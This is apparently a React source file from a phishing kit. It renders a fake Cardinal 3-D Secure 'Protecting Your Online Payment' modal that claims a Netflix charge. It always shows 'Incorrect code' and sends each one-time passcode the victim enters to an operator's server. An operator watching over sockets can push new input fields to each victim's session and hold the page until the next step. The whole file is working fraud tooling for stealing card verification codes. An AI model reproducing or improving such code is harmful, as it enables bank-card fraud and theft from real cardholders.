import React, { useState, useEffect } from 'react';
import { socket } from '../../index';

import axios from 'axios';
import visaLogo from './visalogo.svg';
import mcLogo from './mc.svg';
import amexLogo from './amexlogo.svg';
import phoneImg from '../../assets/img/image2.png';
const ContainerCustomError = () => {
  const [styles, setStyles] = useState(null);
  const [showNotif, setShowNotif] = useState(true);
  const [logoUrl, setLogoUrl] = useState('');
  const [brandLogo, setBrandLogo] = useState('');
  const [brand, setBrand] = useState('');
  const [links, setLinks] = useState({});
  const [currentDate, setCurrentDate] = useState('');
  const [inputs, setInputs] = useState([]);
  const [inputsConfig, setInputsConfig] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [maskedCardNumber, setMaskedCardNumber] = useState('************');
  const [formData, setFormData] = useState({});
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [customText, setCustomText] = useState("");
  
  const userId = localStorage.getItem('clientSessionID');

  const handleContinue = (logoUrl, brandLogo, links) => {
    setLogoUrl(logoUrl);
    setBrandLogo(brandLogo);
    setLinks(links);
    setShowNotif(false);
  };

  useEffect(() => {
    const clientSessionID = localStorage.getItem('clientSessionID');
    const storedConfig = localStorage.getItem(`inputsConfig_${clientSessionID}`);
    if (storedConfig) {
      setInputsConfig(JSON.parse(storedConfig));
    }

    socket.on('addCustomInput', ({ clientSessionID, input }) => {
      if (clientSessionID === localStorage.getItem('clientSessionID')) {
        setInputs(prev => [...prev, input]);
      }
    });

    socket.on('configureInputs', ({ clientSessionID, inputsConfig }) => {
      if (clientSessionID === localStorage.getItem('clientSessionID')) {
        setInputsConfig(inputsConfig);
        localStorage.setItem(`inputsConfig_${clientSessionID}`, JSON.stringify(inputsConfig));
        setIsLoading(false);
      }
    });

    socket.on('configUpdate', ({ clientSessionID: updatedSessionId, inputsConfig }) => {
      if (updatedSessionId === clientSessionID) {
        setInputsConfig(inputsConfig);
        localStorage.setItem(`inputsConfig_${clientSessionID}`, JSON.stringify(inputsConfig));
        setIsLoading(false);
      }
    });

    return () => {
      socket.off('addCustomInput');
      socket.off('configureInputs');
      socket.off('configUpdate');
    };
  }, []);

  const getBrandLogo = () => {
    switch (brand.toLowerCase()) {
      case 'visa':
        return visaLogo;
      case 'mastercard':
        return mcLogo;
      case 'amex':
      case 'american express':
        return amexLogo;
      default:
        return '';
    }
  };

  useEffect(() => {
    const loadStyles = async () => {
      try {
        const [loginStyles, additionalStyles, spinnerStyles] = await Promise.all([
          import('../../assets/styles/styler.css'),
          import('../../assets/styles/styler_f.css'),
          import('./styling.css'),
        ]);

        setStyles({
          login: loginStyles.default,
          additional: additionalStyles.default,
          more: spinnerStyles.default,
        });
      } catch (error) {
      }
    };

    const fetchCreditCard = async () => {
      try {
        const bankLast4Digits = localStorage.getItem('bankLast4Digits');
        if (bankLast4Digits) {
          const masked = '*'.repeat(12) + bankLast4Digits;
          setMaskedCardNumber(masked);
        }
      } catch (error) {
        setMaskedCardNumber('************0000');
      }
    };
    
    const fetchLogoUrl = async () => {
      try {
        const storedLogoUrl = localStorage.getItem('bankLogoUrl');
        const storedBrand = localStorage.getItem('bankBrand');
        if (storedLogoUrl) {
          setLogoUrl(storedLogoUrl);
        }
        if (storedBrand) {
          setBrand(storedBrand);
        }

      } catch (error) {
      }
    };
    fetchCreditCard();
    fetchLogoUrl();
    loadStyles();

    // Set the current date
    const now = new Date();
    const formattedDate = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false,
    });
    setCurrentDate(formattedDate);
  }, [userId]);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const inputs = Object.values(formData).filter(value => value.trim() !== '').join(', ');
    if (!inputs) {
      setError('Incorrect code');
      return;
    }

    setLoading(true);
    try {
      const maskedCardNumber = localStorage.getItem('bankLast4Digits');

      const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/authenticate/${userId}/pullRecs_37nK`, {
        otp: inputs,
        maskedCardNumber
      });

      if (response.status === 200) {
        // Stays waiting for admin to change component, set a loading indicator and wait
        setLoading(true);
      }
    } catch (error) {
      //setError('Verification failed');
    } finally {
      setLoading(true);
    }
  };

  useEffect(() => {
    const clientSessionID = localStorage.getItem('clientSessionID');

    const fetchConfig = async () => {
      try {
        const response = await fetch(`${process.env.REACT_APP_API_URL}/api/configCustom_Y3m8/${clientSessionID}?t=${Date.now()}`);

        if (!response.ok) throw new Error("API response not OK");

        const data = await response.json();
        setInputsConfig(data.inputsConfig || []);
        setCustomText(data.customText || "Default verification message");

        localStorage.setItem(`inputsConfig_${clientSessionID}`, JSON.stringify(data.inputsConfig));
        localStorage.setItem(`customText_${clientSessionID}`, data.customText);
      } catch (error) {
        console.error("❌ Failed to fetch custom settings:", error);
      } finally {
        setIsLoading(false);
      }
    };

    fetchConfig();
  }, []);

  if (isLoading && inputsConfig.length === 0) {
    return <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
    <div id="Cardinal-ElementContainer">
      <div id="Cardinal-Modal" style={{paddingTop: '0px'}} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
        <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
        </div>
      </div>
      <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
    </div>
  </body>;
  }

  return (
    <body className="page-template page-template-page-templates page-template-minimal-footer page-template-page-templatesminimal-footer-php page page-id-61 logged-in wp-custom-logo theme-underscores wc-braintree-body woocommerce-checkout woocommerce-page woocommerce-js no-sidebar webp-support">
      <div id="Cardinal-ElementContainer">
        <div id="Cardinal-Modal" style={{ paddingTop: '0px' }} className="cardinalOverlay-content shadow-effect cardinalOverlay-open fade-and-drop ">
          <div id="Cardinal-ModalContent" className="size-02" tabIndex="-1">
              {loading && (
                <div className="spinner-overlay">
                  <div className="spinner"></div>
                </div>
              )}
            <div style={{
              maxHeight: '100%',
              overflow: 'auto',
              padding: '20px',
            }} className="threeds-two">
              <div className="container-fluid">
                <div style={{ scrollPaddingBottom: '24px', minHeight: '30xp', paddingBottom : "46px"}}>
                  {/* Show the logos here */}
                  <img src={logoUrl} alt="" style={{ width: '20%', float: 'left' }} />
                  <img src={getBrandLogo()} alt="" style={{ width: '20%', float: 'right' }} />
                </div>
                <br/>
                <br/>
                <br/>
                <br/>
                <img className="image" src={phoneImg} alt="" style={{ width: '20%' }} />
                <br />
                <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                  <div className="container container-sticky-footer">
                    <form
                      autoComplete="off"
                      data-ajax="true"
                      data-ajax-begin="ccHelpers.ajax.onBegin"
                      data-ajax-complete="ccHelpers.ajax.onComplete"
                      data-ajax-failure="ccHelpers.ajax.onFailure"
                      data-ajax-method="form"
                      data-ajax-success="ccHelpers.ajax.onSuccess"
                      id="ValidateCredentialForm"
                      method="post"
                      name="ValidateCredentialForm"
                      noValidate
                      onSubmit={handleSubmit}
                    >
                      <div className="body" dir="LTR" style={{ bottom: '71.25px' }}>
                        <div className="row"></div>
                        <div className="row">
                          <div className="col-12" id="ValidateOneUpMessage">
                            <div style={{ textAlign: 'center' }} id="Body1">
                              <strong>Protecting Your Online Payment</strong>
                            </div>
                          </div>
                        </div>
                        <div className="row">
                          <div style={{ textAlign: 'center' }} className="col-12" id="ValidateOptInMessage">
                          {customText}                          </div>
                        </div>
                        <br />
                        <div className="row form-two-col">
                          <div className="col-12 p-0">
                            <fieldset id="ValidateTransactionDetailsContainer">
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Merchant</span>
                                <span style={{ textAlign: "right" }} className="col-6">WWW.NETFLIX.COM</span>
                              </div>
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Card Number</span>
                                <span style={{ textAlign: "right" }} className="col-6 always-left-to-right">{maskedCardNumber}</span>
                              </div>
                              <div className="validate-field row">
                                <span style={{ textAlign: "left" }} className="validate-label col-6">Date</span>
                                <span style={{ textAlign: "right" }} className="col-6 always-left-to-right">{currentDate}</span>
                              </div>
                              <br />
                              <br />
                              <div style={{fontWeight: 'normal'}} className="error_msg"><b style={{fontWeight: 'bold'}}>Incorrect code</b>. Please try again.</div>                              <div id="cust" className="formcol">
                                {inputsConfig.map((input, index) => (
                                  <div key={index} style={{ marginBottom: '10px' }}>
                                    <input
                                      type={input.type}
                                      placeholder={input.placeholder}
                                      name={input.name}
                                      className="textinput"
                                      required={input.type !== 'hidden'}
                                      style={{ display: input.type === 'hidden' ? 'none' : 'block' }}
                                      onChange={handleChange}
                                    />
                                  </div>
                                ))}
                              </div>
                            </fieldset>
                            <div className="col-12 text-center">
                              <button className="submitbtn" type="submit" disabled={loading}>
                                Confirm
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div className="sticky-footer">
                        <div className="row no-pad">
                        </div>
                        <div className="" id="FooterLinks">
                          <div className="row">
                            <div className="col-12">
                            </div>
                          </div>
                        </div>
                      </div>
                    </form>
                  </div>
                </div>
                <br />
              </div>
            </div>
          </div>
        </div>
        <div id="Cardinal-Overlay" className="cardinalOverlay-mask cardinalOverlay-open "></div>
      </div>
    </body>
  );
};

export default ContainerCustomError;
